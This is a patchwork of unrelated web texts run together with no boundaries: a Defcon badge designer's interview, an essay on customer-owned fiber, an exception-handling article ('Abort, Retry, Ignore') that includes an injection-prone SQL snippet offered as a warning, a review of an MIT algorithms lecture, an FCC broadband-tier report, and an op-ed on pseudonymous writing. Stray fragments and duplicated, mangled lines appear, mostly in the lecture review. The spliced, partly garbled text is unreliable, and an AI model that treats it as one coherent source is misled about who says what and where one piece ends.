JG : The artistic elements and the PC board design tricks that I did this year [ are ] some of my favorite parts of doing the badge .
Ping and Dark Tangent do n't necessarily understand the engineering constraints of making circuit boards so they really push me ...
In turn I get to learn a lot of new techniques ...
We 're doing stuff that 's totally crazy and nonstandard for circuit boards .
TL : Are they the same batteries as last year ?
__JG : __No , different batteries .
One of the things I ran into last year that I was pretty embarrassed about was the battery life .
Depending on how much you used the badge , the batteries did n't even last the weekend .
For me one of my major design goals is making sure that the badge lasted longer than Defcon .
This year I went with a larger battery , something that 's way more robust and will just last a long time for people who really want to hack on the badge .
It 's one of the CR123A batteries .
These things will last a long time , weeks if not months .
It 's a little bigger than I would have like , but I placed it in away that hopefully will not get too annoying for people .
TL : Did you see the RFID badges at The Last HOPE ?
Will yours also include some kind of unique ID for buddy / hacker tracking ?
JG : I did n't [ see the HOPE badges ] ...
We talked about the badges being able to either track each other or have some kind of unique identifier , but I think that shit is just way too big brother .
Most people at Defcon do n't even use their real name .
Forcing them to wear a badge that has features like that , to me is crap .
I would n't want to wear one of them .
TL : What were the biggest challenges in the badge development this time around ?
JG : This badge ... ended up taking 200 hours to design , versus the 170 from last year ...
Most of that was because I was trying new things I 'd never done before ...
During the process every time I had an engineering problem or I stayed up late ... I just kept thinking the pain 's going to be worth it .
Once the badge is done and it gets into people 's hands and they just love the way it looks and they have fun with it and they hack on it it makes all of the trouble worthwhile to get people interested into this type of thing .
__TL : __How are you going to top this badge next year ?
JG : I have a few ideas for what I want to do next year assuming we do it ...
I wo n't say what they are yet , but it 's going to be cool .
TL : What other projects are you working on right now ?
__JG : __I just started a new apparel line called Kingpin Empire ...
I am going to donate a portion of the proceeds to hacker related charities and health related charities : EFF , ACLU , American Heart Association .
Things that have personally affected me or personally saved me in some way .
It 's a way for me to spread the hacker message to the masses ... to educate people as to what hacking is about , support hacker and health related causes and give back to the community that shaped my entire life .
__TL : __Anything else you want to say about the badge ?
JG : I just hope people like it .
It 's a labor of love .
The more people that hack on it the better .
I want people to modify it , I want people to fix any problems they might see with it and just make it their own .
If I can inspire just one person out of the 8,500 people that have a badge to start hacking on things and maybe even become and engineering then I 've done my part .

The really long tail
Last month , construction was completed on a pilot project that ran fiber optic cables to 400 homes in Ottawa .
Stringing fiber optic cables is n't a big deal by itself — Verizon has been running fiber to millions of homes in the US — but the Ottawa project comes with a twist : rather than providing Internet access for a monthly fee , the company plans to sell the fiber strands outright to individual homeowners .
This is n't how we 're used to doing telecommunications infrastructure .
Traditionally , a " last mile " copper loop , coax cable , or fiber strand has been owned by an incumbent telephone or cable company , and the customer has paid a monthly fee for telecom services .
But , if the Ottawa experiment is a success , that could change .
In the future , it could become commonplace for homes to come with " tails . "
These customer - owned , fiber - optic connections would link them to a network peering point .
Without the expense of rolling out last mile infrastructure to every home , many more ISPs could afford to serve a given neighborhood by running wiring to the peering point , leading to more competition and lower prices .
Perhaps best of all , the growth of customer - owned fiber could make debates over " open access " and network neutrality moot , as robust telecom competition should prevent the worst of the monopolistic behavior exhibited by telco and cable incumbents .
It 's a tantalizing prospect , but a lot of practical difficulties will have to be overcome to make it a reality .
Incumbent telecom firms may not like the prospect of increased competition , and they 've never been shy about using regulatory barriers to strangle potential competitors in red tape .
Meanwhile , promoters of the concept face a kind of chicken - and - egg problem : a customer - owned fiber strand is only useful if there is robust competition among ISPs at the other end , but companies are n't going to enter the residential ISP market until there 's a critical mass of customer - owned fiber .
Most importantly , it 's not yet clear how the economics will work .
The Ottawa trial suggests that a fiber connection can cost less than $ 3000 per household , but the exact cost depends heavily on site geography and the rate of customer uptake .
It will take several years for the concept to prove itself .
And , if it does , it will take a number of additional years for it to be widely adopted .
Confronting the " last mile " problem
In the quarter century since the breakup of Ma Bell , policymakers have struggled with the " last mile " problem .
Competition is good for consumers and for innovation , but rolling out redundant copper , fiber , or coax lines is wasteful — especially in dense urban areas where it requires ripping up busy streets .
In the late 1990s , the FCC attempted to deal with this problem with a strategy called " open access , " which forced incumbent telephone companies to " share " their infrastructure at rates dictated by the federal government .
The effort was n't exactly a rousing success .
Competitors accused the Baby Bells of foot - dragging and obstructionism .
The Baby Bells , in turn , complained bitterly that the prices set by the FCC were too low to recover their costs .
They also noted that they had little incentive to invest in infrastructure upgrades because any new infrastructure would have had to be shared with competitors .
After years of litigation and regulatory uncertainty , in 2005 the Supreme Court confirmed that cable incumbents were not subject to open - access rules .
Soon afterwards , the FCC threw in the towel on open access for the Baby Bells as well .
The result was the now - familiar duopoly : most American consumers can now get broadband service from their local phone company or their local cable company , but that 's it .
The new arrangement is an undeniable improvement over the old Bell monopoly , but it still has plenty of problems .
In his landmark paper that coined the phrase " network neutrality , " Tim Wu positioned network neutrality regulations as a better strategy for achieving the goals of open access regulation .
As it became clear that the open access model was failing , some activists shifted their focus to demanding the passage of " network neutrality " regulation .
But network neutrality regulation has proven no less controversial .
Critics , including me , warn of the dangers of putting the Internet under the control of the political process .
Just as uncertainties in the 1996 Telecom
Act led to almost a decade of costly litigation , so too could the vagueness of network neutrality regulation could lead to a decade of litigation and the investment - stifling uncertainty that comes with it .
Moreover , there are plenty of historical examples of regulatory schemes with unintended consequences .
Most famously , the Interstate Commerce Commission , the nation 's first modern regulatory agency , did more to protect the railroads from competition than to protect consumers from the railroads .
There is a real danger that incumbent broadband providers could find ways to manipulate network neutrality regulations to their advantage , just as the railroads did a century ago .
The result has been a broadband policy stalemate .
Congress considered , but failed to pass , network neutrality regulation in 2006 .
Since taking control of Congress , the Democratic majority has shown no interest in reviving the proposal .
Proponents of regulation have touted pledges from every Democratic Senate challenger to support regulation , but the prospects for action in the next Congress remain cloudy .
It would n't be the first time that the telcos have derailed legislation they did n't like .
Customer - owned fiber
Customer - owned fiber may offer a way out of this regulatory morass .
It 's hard to believe today but , as Google 's Derek Slater points out , there was a time when the phone company owned the entire telephone network , including the wires inside our homes and the phone on our desks .
Shifting the demarcation point to the outside of our homes created a vibrant market for customer premises equipment : not just telephones , but modems , fax machines , answering machines , and other specialized gear .
With customer - owned fiber , the demarcation point would be shifted even further from the customer .
That would once again mean more responsibility for the customer , but with offsetting benefits that could flow from greater competition .
Slater is working with Tim Wu on a forthcoming paper that discusses the customer - owned fiber model .
Under their proposal , each customer would pay the up - front costs of stringing fiber to her own home .
The fiber would terminate at a carrier - neutral colocation facility , where a variety of ISPs would have a presence .
Because customers , rather than any given ISP , would own the " last mile " to the customer 's house , many more ISPs could afford to compete on an equal footing for customers ' business .
Abort , Retry , Ignore
This article is a follow up to “ Do n’t Catch Exceptions “ , which advocates that exceptions should ( in general ) be passed up to a “ unit of work ” , that is , a fairly coarse - grained activity which can reasonably be failed , retried or ignored .
A unit of work could be :
an entire program , for a command - line script ,
a single web request in a web application ,
the delivery of an e-mail message
the handling of a single input record in a batch loading application ,
rendering a single frame in a media player or a video game , or
an event handler in a GUI program
The code around the unit of work may look something like
[ 01 ] try { [ 02 ] DoUnitOfWork ( ) [ 03 ] } catch ( Exception e ) { [ 04 ] ... examine exception and decide what to do ... [ 05 ] }
For the most part , the code inside DoUnitOfWork ( ) and the functions it calls tries to throw exceptions upward rather than catch them .
To handle errors correctly , you need to answer a few questions , such as
Was this error caused by a corrupted application state ?
Did this error cause the application state to be corrupted ?
Was this error caused by invalid input ?
What do we tell the user , the developers and the system administrator ?
Could this operation succeed if it was retried ?
Is there something else we could do ?
Although it ’s good to depend on existing exception hierarchies ( at least you wo n’t introduce new problems ) , the way that exceptions are defined and thrown inside the work unit should help the code on line [ 04 ] make a decision about what to do — such practices are the subject of a future article , which subscribers to our RSS feed will be the first to read .
The cause and effect of errors
There are a certain range of error conditions that are predictable , where it ’s possible to detect the error and implement the correct response .
As an application becomes more complex , the number of possible errors explodes , and it becomes impossible or unacceptably expensive to implement explicit handling of every condition .
What do do about unanticipated errors is a controversial topic .
Two extreme positions are : ( i ) an unexpected error could be a sign that the application is corrupted , so that the application should be shut down , and ( ii ) systems should bend but not break : we should be optimistic and hope for the best .
Ultimately , there ’s a contradiction between integrity and availability , and different systems make different choices .
The ecosystem around Microsoft Windows , where people predominantly develop desktop applications , is inclined to give up the ghost when things go wrong — better to show a “ blue screen of death ” than to let the unpredictable happen .
In the Unix ecosystem , more centered around server applications and custom scripts , the tendency is to soldier on in the face of adversity .
What ’s at stake ?
Desktop applications tend to fail when unexpected errors happen : users learn to save frequently .
Some of the best applications , such as GNU emacs and Microsoft Word , keep a running log of changes to minimize work lost to application and system crashes .
Users accept the situation .
On the other hand , it ’s unreasonable for a server application that serves hundreds or millions of users to shut down on account of a cosmic ray .
Embedded systems , in particular , function in a world where failure is frequent and the effects must be minimized .
As we ’ll see later , it would be a real bummer if the Engine Control Unit in your car left you stranded home because your oxygen sensor quit working .
The following diagram illustrates the environment of a work unit in a typical application : ( although this application accesses network resources , we ’re not thinking of it as a distributed application .
We ’re responsible for the correct behavior of the application running in a single address space , not about the correct behavior of a process swarm . )
The Input to the work unit is a potential source of trouble .
The input could be invalid , or it could trigger a bug in the work unit or elsewhere in the system ( the “ system ” encompasses everything in the diagram )
Even if the input is valid , it could contain a reference to a corrupted resource , elsewhere in the system .
A corrupted resource could be a damaged data structure ( such as a colored box in a database ) , or an otherwise malfunctioning part of the system ( a crashed server or router on the network . )
Data structures in the work unit itself are the least problematic , for purposes of error handling , because they do n’t outlive the work unit and do n’t have any impact on future work units .
Static application data , on the other hand , persists after the work unit ends , and this has two possible consequences :
The current work unit can fail because a previous work unit caused a resource to be corrupted , and The current work unit can corrupt a resource , causing a future work unit to fail
Osterman ’s argument that applications should crash on errors is based on this reality : an unanticipated failure is a sign that the application is in an unknown ( and possibly bad ) state , and ca n’t be trusted to be reliable in the future .
Stopping the application and restarting it clears out the static state , eliminating resource corruption .
Rebooting the application , however , might not free up corrupted resources inside the operating system .
Both desktop and server applications suffer from operating system errors from time to time , and often can get immediate relief by rebooting the whole computer .
The “ reboot ” strategy runs out of steam when we cross the line from in - RAM state to persistent state , state that ’s stored on disks , or stored elsewhere on the network .
Once resources in the persistent world are corrupted , they need to be ( i ) lived with , or repaired by ( ii ) manual or ( iii ) automatic action .
In either world , a corrupted resource can have either a narrow ( blue ) or wide ( orange ) effect on the application .
For instance , the user account record of an individual user could be damaged , which prevents that user from logging in .
That ’s bad , but it would hardly be catastrophic for a system that has 100,000 users .
It ’s best to ‘ ignore ’ this error , because a system - wide ‘ abort ’ would deny service to 99,999 other users ; the problem can be corrected when the user complains , or when the problem is otherwise detected by the system administrator .
If , on the other hand , the cryptographic signing key that controls the authentication process were lost , nobody would be able to log in : that ’s quite a problem .
It ’s kind of the problem that will be noticed , however , so aborting at the work unit level ( authenticated request ) is enough to protect the integrity of the system while the administrators repair the problem .
Problems can happen at an intermediate scope as well .
For instance , if the system has damage to a message file for Italian users , people who use the system in the Italian language could be locked out .
If Italian speakers are 10 % of the users , it ’s best to keep the system running for others while you correct the problem .
Repair
There are several tools for dealing with corruption in persistent data stores .
In a one - of - a - kind business system , a DBA may need to intervene occasionally to repair corruption .
More common events can be handled by running scripts which detect and repair corruption , much like the fsck command in Unix or the chkdsk command in Windows .
Corruption in the metadata of a filesystem can , potentially , cause a sequence of events which leads to massive data loss , so UNIX systems have historically run the fsck command on filesystems whenever the filesystem is in a questionable state ( such as after a system crash or power failure . )
The time do do an fsck has become an increasing burden as disks have gotten larger , so modern UNIX systems use journaling filesystems that protect filesystem metadata with transactional semantics .
Release and Rollback
One role of an exception handler for a unit of work is to take steps to prevent corruption .
This involves the release of resources , putting data in a safe state , and , when possible , the rollback of transactions .
Although many kinds of persistent store support transactions , and many in - memory data structures can support transactions , the most common transactional store that people use is the relational database .
Although transactions do n’t protect the database from all programming errors , they can ensure that neither expected or unexpected exceptions will cause partially - completed work to remain in the database .
A classic example in pseudo code is the following :
[ 06 ] function TransferMoney ( fromAccount , toAccount , amount ) { [ 07 ] try { [ 08 ] BeginTransaction ( ) ; [ 09 ] ChangeBalance ( toAccount , amount ) ; [ 10 ] ... something throws exception here ... [ 11 ] ChangeBalance ( fromAccount , - amount ) ; [ 12 ] CommitTransaction ( ) ; [ 13 ] } catch ( Exception e ) { [ 14 ] RollbackTransaction ( ) ; [ 15 ] } [ 16 ] }
In this ( simplified ) example , we ’re transferring money from one bank account to another .
Potentially an exception thrown at line [ 05 ] could be serious , since it would cause money to appear in toAccount without it being removed from fromAccount .
It ’s bad enough if this happens by accident , but a clever cracker who finds a way to cause an exception at line [ 05 ] has discovered a way to steal money from the bank .
Fortunately we ’re doing this financial transaction inside a database transaction .
Everything done after BeginTransaction ( ) is provisional : it does n’t actually appear in the database until CommitTransaction ( ) is called .
When an exception happens , we call RollbackTransaction ( ) , which makes it as if the first ChangeBalance ( ) had never been called .
As mentioned in the “ Do n’t Catch Exceptions ” article , it often makes sense to do release , rollback and repairing operations in a finally clause rather than the unit - of - work catch clause because it lets an individual subsystem take care of itself — this promotes encapsulation .
However , in applications that use databases transactionally , it often makes sense to push transaction management out the the work unit .
Why ?
Complex database operations are often composed out of simpler database operations that , themselves , should be done transactionally .
To take an example , imagine that somebody is opening a new account and funding it from an existing account :
[ 17 ] function OpenAndFundNewAccount( accountInformation , oldAccount , amount ) { [ 18 ] if ( amount < MinimumAmount ) { [ 19 ] throw new InvalidInputException ( [ 20 ] " Attempted To Create Account With Balance Below Minimum " [ 21 ] ) ; [ 22 ] } [ 23 ] newAccount=CreateNewAccountRecords(accountInformation ) ; [ 24 ] TransferMoney ( oldAccount , newAccount , amount ) ; | [ 25 ] }
It ’s important that the TransferMoney operation be done transactionally , but it ’s also important that the whole OpenAndFundNewAccount operation be done transactionally too , because we do n’t want an account in the system to start with a zero balance .
A straightforward answer to this problem is to always do banking operations inside a unit of work , and to begin , commit and roll back transactions at the work unit level :
[ 26 ] AtmOutput ProcessAtmRequest( AtmInput in ) { [ 27 ] try { [ 28 ] BeginTransaction ( ) ; [ 29 ] BankingOperation op=AtmInput.ParseOperation ( ) ; [ 30 ] var out=op .
Execute ( ) ; [ 31 ] var atmOut=AtmOutput.Encode( out ) ; [ 32 ] CommitTransaction ( ) ; [ 33 ] return atmOut ; [ 34 ] } [ 35 ] catch ( Exception e ) { [ 36 ] RollbackTransaction ( ) ; [ 37 ] ... Complete Error Handling ... [ 38 ] }
In this case , there might be a large number of functions that are used to manipulate the database internally , but these are only accessable to customers and bank tellers through a limited set of BankingOperations that are always executed in a transaction .
Notification
There are several parties that could be notified when something goes wrong with an application , most commonly :
the end user , the system administrator , and the developers .
Sometimes , as in the case of a public - facing web application , # 2 and # 3 may overlap .
In desktop applications , # 2 might not exist .
Let ’s consider the end user first .
The end user really needs to know ( i ) that something went wrong , and ( ii ) what they can do about it .
Often errors are caused by user input : hopefully these errors are expected , so the system can tell the user specifically what went wrong : for instance ,
[ 39 ] try { [ 40 ] ... process form information ... [ 41 ] [ 42 ] if (! IsWellFormedSSN(ssn ) ) [ 43 ] throw new InvalidInputException ( " You must supply a valid social security number " ) ; [ 44 ] [ 45 ] ... process form some more ... [ 46 ] } catch ( InvalidInputException e ) { [ 47 ] DisplayError(e. Message ) ; [ 48 ] }
other times , errors happen that are unexpected .
Consider a common ( and bad ) practice that we see in database applications : programs that write queries without correctly escaping strings :
[ 49 ] dbConn. Execute ( " [ 50 ] INSERT INTO people ( first_name , last_name ) [ 51 ] VALUES ( '" +firstName + " ' ,'+lastName + " ' ) ; [ 52 ] " ) ;
this code is straightforward , but dangerous , because a single quote in the firstName or lastName variable ends the string literal in the VALUES clause , and enables an SQL injection attack .
( I ’d hope that you know better than than to do this , but large projects worked on by large teams inevitably have problems of this order . )
This code might even hold up well in testing , failing only in production when a person registers with
[ 53 ] lastName = " O' Reilly " ;
Now , the dbConn is going to throw something like a SqlException with the following message :
[ 54 ] SqlException .
Message = " Invalid SQL Statement : [ 55 ] INSERT INTO people ( first_name , last_name ) [ 56 ] VALUES ( ' Baba ' , 'O' Reilly ' ) ; "
we could show that message to the end user , but that message is worthless to most people .
Worse than that , it ’s harmful if the end user is a cracker who could take advantage of the error — it tells them the name of the affected table , the names of the columns , and the exact SQL code that they can inject something into .
You might be better off showing users something like :
and telling them that they ’ve experienced an “ Internal Server Error . ”
Even so , the discovery that a single quote can cause an “ Internal Server Error ” can be enough for a good cracker to sniff out the fault and develop an attack in the blind ..
What can we do ?
Warn the system administrators .
The error handling system for a server application should log exceptions , stack trace and all .
It does n’t matter if you use the UNIX syslog mechanism , the logging service in Windows NT , or something that ’s built into your server , like Apache ’s error_log .
Although logging systems are built into both Java and .
Net , many developers find that Log4J and Log4N are especially effective .
There really are two ways to use logs :
Detailed logging information is useful for debugging problems after the fact .
For instance , if a user reports a problem , you can look in the logs to understand the origin of the problem , making it easy to debug problems that occur rarely : this can save hours of time trying to understand the exact problem a user is experiencing .
A second approach to logs is proactive : to regularly look a logs to detect problems before they get reported .
In the example above , the SqlException would probably first be thrown by an innocent person who has an apostrophe in his or her name — if the error was detected that day and quickly fixed , a potential security hole could be fixed long before it would be exploited .
Organizaitons that investigate all exceptions thrown by production web applications run the most secure and reliable applications .
In the last decade it ’s become quite common for desktop applications to send stack traces back to the developers after a crash : usually they pop up a dialog box that asks for permission first .
Although developers of desktop applications ca n’t be as proactive as maintainers of server applications , this is a useful tool for discovering errors that escape testing , and to discover how commonly they occur in the field .
Retry I : Do it again !
Some errors are transient : that is , if you try to do the same operation later , the operation may succeed .
Here are a few common cases :
An attempt to write to a DVD - R could fail because the disk is missing from the drive
A database transaction could fail when you commit it because of a conflict with another transaction : an attempt to do the transaction again could succeed
An attempt to deliver a mail message could fail because of problems with the network or destination mail server
A web crawler that crawls thousands ( or millions ) of sites will find that many of them are down at any given time : it needs to deal with this reasonably , rather than drop your site from it ’s index because it happened to be down for a few hours
Transient errors are commonly associated with the internet and with remote servers ; errors are frequent because of the complexity of the internet , but they ’re transitory because problems are repaired by both automatic and human intervention .
For instance , if a hardware failure causes a remote web or email server to go down , it ’s likely that somebody is going to notice the problem and fix it in a few hours or days .
One strategy for dealing with transient errors is to punt it back to the user : in a case like this , we display an error message that tells the user that the problem might clear up if they retry the operation .
This is implicit in how web browsers work : sometimes you try to visit a web page , you get an error message , then you hit reload and it ’s all OK .
This strategy is particularly effective when the user could be aware that there ’s a problem with their internet connection and could do something about it : for instance , they might discover that they ’ve moved their laptop out of Wi-Fi range , or that the DSL connection at their house has gone down for the weekend .
SMTP , the internet protocol for email , is one of the best examples of automated retry .
Compliant e-mail servers store outgoing mail in a queue : if an attempt to send mail to a destination server fails , mail will stay in the queue for several days before reporting failure to the user .
Section 4.5.4 of RFC 2821 states :
The sender MUST delay retrying a particular destination after one attempt has failed .
In general , the retry interval SHOULD be at least 30 minutes ; however , more sophisticated and variable strategies will be beneficial when the SMTP client can determine the reason for non-delivery .
Retries continue until the message is transmitted or the sender gives up ; the give - up time generally needs to be at least 4 - 5 days .
The parameters to the retry algorithm MUST be configurable .
A client SHOULD keep a list of hosts it cannot reach and corresponding connection timeouts , rather than just retrying queued mail items .
Experience suggests that failures are typically transient ( the target system or its connection has crashed ) , favoring a policy of two connection attempts in the first hour the message is in the queue , and then backing off to one every two or three hours .
Practical mail servers use fsync( ) and other mechanisms to implement transactional semantics on the queue : the needs of reliability make it expensive to run an SMTP - compliant server , so e-mail spammers often use non-compliant servers that do n’t correctly retry ( if they ’re going to send you 20 copies of the message anyway , who cares if only 15 get through ? )
Greylisting is a highly effective filtering strategy that tests the compliance of SMTP senders by forcing a retry .
Retry II : If first you do n’t succeed …
An alternate form of retry is to try something different .
For instance , many programs in the UNIX environment will look in many different places for a configuration file : if the file is n’t in the first place tried , it will try the second place and so forth .
The online e-print server at arXiv.org has a system called AutoTex which automatically converts documents written in several dialects of TeX and LaTeX into Postscript and PDF files .
AutoTex unpacks the files in a submission into a directory and uses chroot to run the document processing tools in a protected sandbox .
It tries about of ten different configurations until it finds one that successfully compiles the document .
In embedded applications , where availability is important , it ’s common to fall back to a “ safe mode ” when normal operation is impossible .
The Engine Control Unit in a modern car is a good example :
Since the 1970′s , regulations in the United States have reduced emissions of hydrocarbons and nitrogen oxides from passenger automobiles by more than a hundred fold .
The technology has many aspects , but the core of the system in an Engine Control Unit that uses a collection of sensors to monitor the state of the engine and uses this information to adjust engine parameters ( such as the quantity of fuel injected ) to balance performance and fuel economy with environmental compliance .
As the condition of the engine , driving conditions and composition of fuel change over the time , the ECU normally operates in a “ closed - loop ” mode that continually optimizes performance .
When part of the system fails ( for instance , the oxygen sensor ) the ECU switches to an “ open - loop ” mode .
Rather than leaving you stranded , it lights the “ check engine ” indicator and operates the engine with conservative assumptions that will get you home and to a repair shop .
Ignore ?
One strength of exceptions , compared to the older return - value method of error handling is that the default behavior of an exception is to abort , not to ignore .
In general , that ’s good , but there are a few cases where “ ignore ” is the best option .
Ignoring an error makes sense when :
Security is not at stake , and there ’s no alternative action available , and the consequences of an abort are worse than the consequences of avoiding an error
The first rule is important , because crackers will take advantage of system faults to attack a system .
Imagine , for instance , a “ smart card ” chip embedded in a payment card .
People have successfully extracted information from smart cards by fault injection : this could be anything from a power dropout to a bright flash of light on an exposed silicon surface .
If you ’re concerned that a system will be abused , it ’s probably best to shut down when abnormal conditions are detected .
On the other hand , some operations are vestigial to an application .
Imagine , for instance , a dialog box that pops when an application crashes that offers the user the choice of sending a stack trace to the vendor .
If the attempt to send the stack trace fails , it ’s best to ignore the failure — there ’s no point in subjecting the user to an endless series of dialog boxes .
“ Ignoring ” often makes sense in the applications that matter the most and those that matter the least .
For instance , media players and video games operate in a hostile environment where disks , the network , sound and controller hardware are uncooperative .
The “ unit of work ” could be the rendering of an individual frame : it ’s appropriate for entertainment devices to soldier on despite hardware defects , unplugged game controllers , network dropouts and corrupted inputs , since the consequences of failure are no worse than shutting the system down .
In the opposite case , high - value systems and high - risk should continue functioning no matter what happen .
The software for a space probe , for instance , should never give up .
Much like an automotive ECU , space probes default to a “ safe mode ” when contact with the earth is lost : frequently this strategy involves one or more reboots , but the goal is to always regain contact with controllers so that the mission has a chance at success .
Conclusion
It ’s most practical to catch exceptions at the boundaries of relatively coarse “ units of work . ”
Although the handling of errors usually involves some amount of rollback ( restoring system state ) and notification of affected people , the ultimate choices are still what they were in the days of DOS : abort , retry , or ignore .
Correct handling of an error requires some thought about the cause of an error : was it caused by bad input , corrupted application state , or a transient network failure ?
It ’s also important to understand the impact the error has on the application state and to try to reduce it using mechanisms such as database transactions .
“ Abort ” is a logical choice when an error is likely to have caused corruption of the application state , or if an error was probably caused by a corrupted state .
Applications that depend on network communications sometimes must “ Retry ” operations when they are interrupted by network failures .
Another form of “ Retry ” is to try a different approach to an operation when the first approach fails .
Finally , “ Ignore ” is appropriate when “ Retry ” is n’t available and the cost of “ Abort ” is worse than soldiering on .
This article is one of a series on error handling .
The next article in this series will describe practices for defining and throwing exceptions that gives exception handlers good information for making decisions .

Feed will be the first to read it .
This is the second post in an article series about MIT 's lecture course " Introduction to Algorithms . "
I changed my mind a little on how I will be posting the reviews of lectures .
In the first post I said that I will be posting reviews of two or three lectures at a time , but I decided to group them by topic instead .
This is more logical .
Some lectures stand out alone .
Lecture 3 is like that .
Lecture three is all all about a powerful technique in algorithm design called Divide and Conquer .
I wo n't be able to describe it better than the CLRS book , which says : " Divide and Conquer algorithms break the problem into several subproblems that are similar to the original problem but smaller in size , solve the subproblems recursively , and then combine these solutions to create a solution to the original problem . "
There are three steps to applying Divide and Conquer algorithm in practice :
Divide the problem into one ore more subproblems .
the problem into one ore more subproblems .
Conquer subproblems by solving them recursively .
If the subproblem sizes are small enough , however , just solve the subproblems in a straightforward manner .
subproblems by solving them recursively .
If the subproblem sizes are small enough , however , just solve the subproblems in a straightforward manner .
Combine the solutions to the subproblems into the solution for the original problem .
An example of Divide and Conquer is the Merge Sort algorithm covered in lecture one :
Divide :
Divide the n-element sequence to be sorted into two subsequences of n/2 elements each .
: Divide the n-element sequence to be sorted into two subsequences of n/2 elements each .
Conquer :
Sort the two subsequences recursively using Merge Sort .
: Sort the two subsequences recursively using Merge Sort.
Combine : Merge the two sorted subsequences to produce the sorted answer .
The recursion stops when the sequence to be sorted has length 1 , in which case there is nothing else to be done , since every sequence of length 1 is already in sorted order .
Lecture three presents various other algorithms which use the powerful Divide and Conquer technique .
It starts by the running time analysis of Merge Sort algorithms and shows the general structure of recurrence equations generated by Divide and Conquer algorithms .
Then it moves on to Binary Search algorithm which allows finding an element in a sorted array in time proportional to logarithm of array length , or speaking in asymptotic notation speech , it 's worst running time complexity is O( lg ( n ) ) .
A naive algorithm which just scanned through all elements of an array would have time complexity of O(n ) which is much , much worse .
The next algorithm presented solves the problem stated as following : given a number x and given an integer n , compute x to the power n .
A naive algorithm would create a loop from 1 to n , and multiply the x with itself :
result = 1 Naive - Power( x , n ) : for 1 to n : result = x * result return result
This leads to running time of O(n ) .
A much more clever approach is to use an algorithm called Recursive Powering .
The idea to calculate xn is to express xn as :
x n/2 ­·x n/2 ­ if n is even , or
­·x ­ if n is even , or x ( n - 1 ) / 2·­x ( n - 1 ) / 2·x , if n is odd .
Here is the pseudo - code of this algorithm :
Recursive - Power( x , n ) : if n == 1 return x if n is even y = Recursive - Power ( x , n /2 ) return y*y else y = Recursive - Power ( x , ( n - 1 ) / 2 ) return y*y*x
Doing asymptotic analysis of this algorithm leads to O ( lg ( n ) ) running time , which is a great improvement over O(n ) .
The lecture continues with four algorithms on how to compute Fibonacci Numbers .
You should definitely watch that .
Man , it 's four algorithms .
It 's at 17:49 in the lecture .
I wo n't give the pseudo code here for these ones , but they are naive recursive algorithm , bottom up algorithm , naive recursive squaring and recursive squaring .
The next two topics are Matrix Multiplication the naive way , giving O ( n3 ) running time , and an improved Strassen 's Algorithm which reduces the number of multiplications yielding running time of approximately O( n 2.81 ) .
The last topic covered in this lecture is VLSI ( Very large Scale Integration ) layout problem : given a number of various electronic gates an chips , how to position them on the circuit board to minimize area they occupy .

The next post will be about two lectures on sorting algorithms .
The Federal Communications Commission has officially revised the way that it measures broadband penetration , a system that was formerly the laughing stock of some observers in Europe .
The agency will no longer define either upload or download speed at 200 Kbps as " high speed broadband . "
Rather , it will diplomatically classify this and all connections up to 768 K with the gentle phrase " First Generation data . "
" I am pleased that the Commission finally moved away from its antiquated definition of broadband as 200 kilobits per second , which had become something of a running joke , " declared one Commissioner after Thursday 's Order .
Here are the FCC 's new classifications for tiers of Internet service :
" First Generation data : " 200 Kbps up to 768 Kbps
" Basic Broadband : " 768 Kbps to 1.5 Mbps
1.5 Mbps to < 3.0 Mbps
3.0 Mbps to < 6.0 Mbps
6.0 Mbps to < 10.0 Mbps
10.0 Mbps to < 25.0 Mbps
25.0 Mbps but < 100.0 Mbps
100.0 Mbps and beyond
The Commission has also revised its Form 477 , which Internet service providers fill out to provide the agency with a snapshot of the state of national broadband penetration .
At present , ISPs must report all five digit zip codes in which they have at least one customer .
This distorted method created the broadband equivalent of " rotten boroughs " in pre-Victorian England — rural districts that were home to only a handful of farmers but still enjoyed full representation in Parliament .
Now the agency will collect actual subscribership numbers in Census Tract areas rather than zip codes .
The data will be further broken down by the new broadband categories and types of technology used .
The agency will also apply this new system of measurement to mobile wireless device users , and it will count VoIP subscribers more rigorously .
VoIP providers must report the number of end users and resale subscribers they have in each state .
They will also have to report data on whether they provide a broadband connection in tandem with their service , and whether the service must be used over a particular high speed connection .
Since I joined . . .
The agency 's latest assessment ( through June 2007 ) of high speed deployment in the United States uses the old " running joke " system of measurement , to borrow Commissioner Tate 's phrase : a high speed connection defined at 200 Kbps or more in at least one direction .
But that did not stop FCC Chair Kevin Martin from proudly reporting and even taking a little credit for it .
" During the first half of 2007 , high speed lines increased by 22 percent , from over 82 million to over 100 million lines , " Martin said on Thursday .
" Since I joined the Commission , these lines have grown 950 % from just over 9 million lines to over 100 million lines . "
But a closer look at the data indicates that a much smaller number of Americans have lines at higher speeds than 2.5 Mbps : 37.7 million lines provide access at speeds greater than or equal to 2.5 Mbps but less than 10 Mbps .
While the public interest group Free Press applauded the FCC's new data collection tools , it called Martin 's assessment of the latest broadband numbers " divorced from reality . "
" The FCC has declared ' mission accomplished ' on broadband despite the mountain of evidence of America 's broadband market woes , " S. Derek Turner , Free Press 's research director said on Friday .
In Mr. Ed Tubbs recent article , Today is the Fourth .
Stand up .
For at least once in your life STAND UP ! , he attacks anonymous and pseudonymous writers as " summer soldiers " and spineless cowards .
I write this in respectful disagreement .
I write under my real name most of the time .
I use pseudonyms occasionally , such as when I write satire or sarcasm that I would rather not be associated with my " serious " byline .
But I use " JC Garrett " when I write articles , while I use " Chris Garrett " when writing to my Congressman , Senators and most other government officials .
Both are my real name , but I would rather not make it easy for a simple computer search by a staffer to find out exactly what kind of trouble that dissident , Chris Garrett , has been stirring up .
It helps ensure that " Chris Garrett " does n't get blacklisted from congressional e-mail lists .
And since my Congressman was a prominent judge before my mentally - challenged neighbors foolishly elected him to represent them in Washington , it provides a slight buffer to the harassment and vindictive abuses of power in which those in high positions so frequently engage .
He 's got buddies in the sheriff 's office who would be glad to oblige a request to make someone 's life a little less pleasant .
While I do n't usually fly or travel out of the country , many people have been added to the government watchlists because of their letters to the editor of their home - town newspapers .
This is not an exaggeration .
It is a fact .
The Washington Post reported in September 2007 that Zakariya Reed , a Toledo firefighter , " has been detained at least seven times at the Michigan border since fall 2006 . "
He was questioned twice by border officials about " politically charged " opinion pieces he had published in his local newspaper that were critical of U.S. policy in the Middle East .
Once , he said , " they had them printed out on the table in front of me . "
Too often , dissent is treated as a crime .
The " incitement " doctrine has been used to crack down on free speech , and the Patriot Act has removed any barriers that once held the state in check .
It 's amazing how far we have drifted from what used to be known as freedom .
President Abraham Lincoln once said :
This country , with its institutions , belongs to the people who inhabit it .
